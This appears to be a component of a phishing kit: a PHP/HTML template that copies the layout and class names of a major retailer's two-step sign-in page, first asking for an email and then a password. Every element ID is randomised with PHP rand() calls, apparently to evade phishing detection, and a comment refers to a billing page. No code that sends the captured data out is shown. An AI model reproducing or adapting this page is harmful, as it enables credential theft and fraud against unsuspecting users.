<!-- HTML INPUTS FOR BILING PAGE -->
<!-- CODE STARTS HERE -->
<body id="<?="x_".rand(45, 23)."ID-Z".rand(425, 126)?>" >
   <div id="a-page" class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
      <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" class="a-section a-padding-medium auth-workflow">
         <div id="<?="x_".rand(25, 78)."ID-Z".rand(1358, 854)?>" class="a-section a-spacing-none auth-navbar">
            <div id="<?="x_".rand(34, 63)."ID-Z".rand(963, 365)?>" class="a-section a-spacing-medium a-text-center">
               <a class="a-link-nav-icon" tabindex="-1" href="#">
               <i class="a-icon a-icon-logo"><span class="a-icon-alt"></span></i>
               </a>
            </div>
         </div>
         <div id="<?="x_".rand(26, 775)."ID-Z".rand(222, 999)?>" class="a-section">
            <div id="<?="x_".rand(324, 203)."ID-Z".rand(435, 33)?>" class="a-section">
               <div id="<?="x_".rand(555, 44)."ID-Z".rand(36, 362)?>" class="a-section auth-pagelet-container">
                  <div id="<?="x_".rand(346, 733)."ID-Z".rand(643, 373)?>" class="a-section a-spacing-base">
                     <div id="<?="x_".rand(63, 66)."ID-Z".rand(378, 994)?>" class="a-section">
                        <form name="x_form" method="post" action="#">
                           <div id="div1" class="a-section">
                              <div id="<?="x_".rand(456, 77)."ID-Z".rand(336, 77)?>" class="a-box">
                                 <div id="<?="x_".rand(55, 240)."ID-Z".rand(33, 975)?>" class="a-box-inner a-padding-extra-large">
                                    <h1 class="a-spacing-small">
                                       <?php echo $_LANG['TITLESIGNIN1'];?>
                                    </h1>
                                    <div id="<?="x_".rand(3E7, 20)."ID-Z".rand(333, 666)?>"  class="a-row a-spacing-base">
                                       <label for="ap_email" class="a-form-label">
                                       <?php echo $_LANG['TITLESIGNIN2'];?>
                                       </label>
                                       <input type="email" id="ap_email" name="email" required pattern=".{5,}" maxlength="50" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
                                          <div class="a-box-inner a-alert-container">
                                             <i class="a-icon a-icon-alert"></i>
                                             <div class="a-alert-content">
                                                <?php echo $_LANG['TITLEFAIL'];?>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div id="<?="x_".rand(3554, 260)."ID-Z".rand(66, 33)?>" class="a-section">
                                       <span class="a-button a-button-span12 a-button-primary"><span class="a-button-inner">
                                       <button type="button" id="formButton" class="a-button-input"><?php echo $_LANG['CONTINUE'];?></button>
                                       <span id="continue-announce" class="a-button-text" aria-hidden="true">
                                       <?php echo $_LANG['CONTINUE'];?>
                                       </span></span></span>
                                    </div>
                                    <div id="<?="x_".rand(364, 260)."ID-Z".rand(789, 33)?>" class="a-section">
                                       <div id="<?="x_".rand(374, 270)."ID-Z".rand(789, 5176)?>"  aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
                                          <a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
                                          <?php echo $_LANG['HELP'];?>
                                          </span></a>
                                          <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                             <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
                                             <?php echo $_LANG['FORGOT'];?>
                                             </a>
                                          </div>
                                          <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                             <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
                                             <?php echo $_LANG['OTHER'];?>
                                             </a>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div id="div2" style="display:none" class="a-section">
                              <div id="<?="x_".rand(344, 240)."ID-Z".rand(7289, 5)?>"  class="a-box">
                                 <div id="<?="x_".rand(434, 260)."ID-Z".rand(7879, 3)?>" class="a-box-inner a-padding-extra-large">
                                    <h1 class="a-spacing-small">
                                       <?php echo $_LANG['TITLESIGNIN1'];?>
                                    </h1>
                                    <div id="<?="x_".rand(634, 20)."ID-Z".rand(366, 777)?>" class="a-row a-spacing-base">
                                       <span id="x-span">
                                          <script type="text/javascript">
                                             $(function() {
                                                 $('#ap_email').keyup(function() {
                                                     $('#x-span').text($(this).val());
                                                 });
                                             });
                                             			   
                                          </script>
                                       </span>
                                       <span id="<?="x_".rand(444, 666)."ID-Z".rand(222, 888)?>" > <a id="ap_change_login_claim" class="a-link-normal" tabindex="6" href="">
                                       <?php echo $_LANG['CHANGE'];?>
                                       </a></span>
                                    </div>
                                    <div id="<?="x_".rand(111, 22)."ID-Z".rand(462, 953)?>" class="a-section a-spacing-large">
                                       <div id="<?="x_".rand(765, 765)."ID-Z".rand(32, 87)?>" class="a-row">
                                          <div id="<?="x_".rand(765, 234)."ID-Z".rand(987, 343)?>" class="a-column a-span5">
                                             <label for="ap_password" class="a-form-label">
                                             <?php echo $_LANG['TITLEPASSWORD'];?>
                                             </label>
                                          </div>
                                          <div id="<?="x_".rand(8765, 437)."ID-Z".rand(3457, 854)?>" class="a-column a-span7 a-text-right a-span-last">
                                             <a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="">
                                             <?php echo $_LANG['FORGOT'];?>
                                             </a>
                                          </div>
                                       </div>
                                       <input type="password" id="ap_password" name="password" required autocomplete="off" required="" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                       <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
                                          <div id="<?="x_".rand(294, 850)."ID-Z".rand(4740, 4570)?>" class="a-box-inner a-alert-container">
                                             <i class="a-icon a-icon-alert"></i>
                                             <div class="a-alert-content">
                                                <?php echo $_LANG['PASSWORD'];?>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div id="<?="x_".rand(358, 4684)."ID-Z".rand(45943, 9456)?>" class="a-section">
                                       <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
                                       <?php echo $_LANG['TITLESIGNIN1'];?>
                                       </span></span></span>
                                       <div id="<?="x_".rand(346, 732)."ID-Z".rand(7363, 883)?>" class="a-row a-spacing-top-medium">
                                          <div class="a-section a-text-left">
                                             <label for="auth-remember-me" class="a-form-label">
                                                <div data-a-input-name="rememberMe" class="a-checkbox">
                                             <label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
                                             <?php echo $_LANG['TITLEKEEP'];?>
                                             <span id="<?="x_".rand(45734, 3457)."ID-Z".rand(23463246, 57347)?>" class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;<?php echo $_LANG['NOTICEKEEP'];?>\&quot; <?php echo $_LANG['CHECKKEEP'];?>&quot;,&quot;inlineContent&quot;:&quot;<p><?php echo $_LANG['NOTICEKEEP1'];?><\/p>\n<p><?php echo $_LANG['NOTICEKEEP2'];?> <?php echo $_LANG['NOTICEKEEP3'];?><\/p>&quot;}">
                                             <a href="javascript:void(0)" class="a-popover-trigger a-declarative">
                                             <?php echo $_LANG['DETAIL'];?>
                                             <i class="a-icon a-icon-popover"></i></a>
                                             </span>
                                             </span></label></div>
                                             </label>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </form>
                     </div>
                     <div class="a-divider a-divider-break"><h5><?php echo $_LANG['NEW'];?></h5>
                     </div>
                     <span id="auth-create-account-link" class="a-button a-button-span12"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button">
                     <?php echo $_LANG['SIGNUP'];?>
                     </a></span></span>
                  </div>
               </div>
            </div>
         </div>
         <div id="right-2">
         </div>
         <div id="<?="x_".rand(114357341, 3845)."ID-Z".rand(346237, 5484)?>"class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
               <div class="a-divider-inner"></div>
            </div>
            <div id="<?="x_".rand(3475, 8845)."ID-Z".rand(22875, 54683)?>"class="a-section a-spacing-small a-text-center a-size-mini">
               <span class="auth-footer-seperator"></span>
               <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
               <?php echo $_LANG['FOOT'];?> 
               </a>
               <span id="<?="x_".rand(3636, 24588)."ID-Z".rand(9767, 575)?>"class="auth-footer-seperator"></span>
               <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
               <?php echo $_LANG['FOOT1'];?> 
               </a>
               <span id="<?="x_".rand(4643, 77)."ID-Z".rand(345, 7343)?>" class="auth-footer-seperator"></span>
               <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
               <?php echo $_LANG['FOOT2'];?> 
               </a>
               <span id="<?="x_".rand(3457, 346)."ID-Z".rand(347, 2478)?>"class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center">
               <span id="<?="x_".rand(357345, 843573)."ID-Z".rand(342325, 7345)?>" class="a-size-mini a-color-secondary">
               <?php echo $_LANG['FOOT3'];?> 
               </span> 
            </div>
         </div>
      </div>
   </div>
</body>
<!-- CODE ENDS HERE -->